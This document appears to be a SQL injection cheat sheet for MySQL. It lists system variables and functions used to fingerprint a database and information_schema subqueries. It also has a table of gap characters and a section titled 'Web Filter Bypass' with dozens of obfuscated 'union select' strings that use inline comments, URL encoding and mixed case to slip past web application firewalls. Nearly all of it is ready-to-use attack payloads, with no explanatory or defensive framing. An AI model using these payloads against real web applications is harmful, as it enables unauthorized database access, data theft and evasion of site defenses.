@@hostname                             
@@tmpdir
@@datadir
@@basedir
@@log
@@log_bin                                                                
@@log_error                                                          
@@binlog_format                       
@@time_format                                                    
@@date_format                                                    
@@ft_boolean_syntax                                           
@@innodb_log_group_home_dir                                            
@@new                                                                  
@@version                                                              
@@version_comment
@@version_compile_os
@@version_compile_machine
@@GLOBAL.have_symlink
@@GLOBAL.have_ssl
@@GLOBAL.VERSION

version()                                                            
table_name()                                                           
user()                                                                 
system_user()                                                          
session_user()
database()                                                             
column_name()                                                          
collation(user())                                                      
collation(\N)                                                          
schema()
UUID()
current_user()
current_user


dayname(from_days(401))                                                
dayname(from_days(402))                                                
dayname(from_days(403))                                                
dayname(from_days(404))                                                
dayname(from_days(405))                                                
dayname(from_days(406))                                                
dayname(from_days(407))                                                

monthname(from_days(690))                                              
monthname(from_unixtime(1))
                                          
collation(convert((1)using/**/koi8r))

(select(collation_name)from(information_schema.collations)where(id)=1 
(select(collation_name)from(information_schema.collations)where(id)=23 
(select(collation_name)from(information_schema.collations)where(id)=36 
(select(collation_name)from(information_schema.collations)where(id)=48 
(select(collation_name)from(information_schema.collations)where(id)=50 
------forever----


Adding Gaps Between requests

testtest        nospace    0x1a
test*test       *              0x2a
test:test       :                0x3a
test::test      ::                0x3a3a
testJtest       J               0x4a
testZtest      Z              0x5a
testjtest        j               0x6a
testztest       z               0x7a
testtest        nospace     0x8a
testtest        nospace     0x9a
test test       SPACE     0x10a


Web Filter Bypass 'union select' keyword strings


union select           
!UNiOn*/ /*!SeLEct*/
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*--*/union/*--*/select/*--*/
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
+UnIOn%0D%0ASeleCt%0D%0A 
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A